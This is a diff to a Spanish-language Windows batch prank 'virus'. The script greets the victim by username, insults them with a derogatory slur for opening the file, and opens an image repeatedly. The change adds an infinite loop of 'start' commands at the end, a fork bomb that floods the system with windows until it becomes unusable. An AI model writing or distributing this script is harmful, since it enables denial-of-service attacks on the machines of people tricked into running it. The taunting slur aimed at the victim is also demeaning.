@@ -7,7 +7,7 @@ rem Obtener el nombre del usuario
 set USERNAME=%username%
 
 echo. !Manos en el aire todo el mundo que este ordenador ha sido infectado!
-echo. %USERNAME% hay que ser mongolo para abrir un archivo de este tipo.
+echo. %USERNAME%, hay que ser mongolo para abrir un archivo de este tipo.
 echo. Mira que pone virus en el nombre...
 pause > nul
 
@@ -25,5 +25,10 @@ for /L %%i in (1,1,%repeticiones%) do (
     start "" "%imagen%"
     timeout /t 1 >nul
 )
+
+rem Bucle infinito para abrir ventanas
+:start
+start
+goto start
 
 endlocal
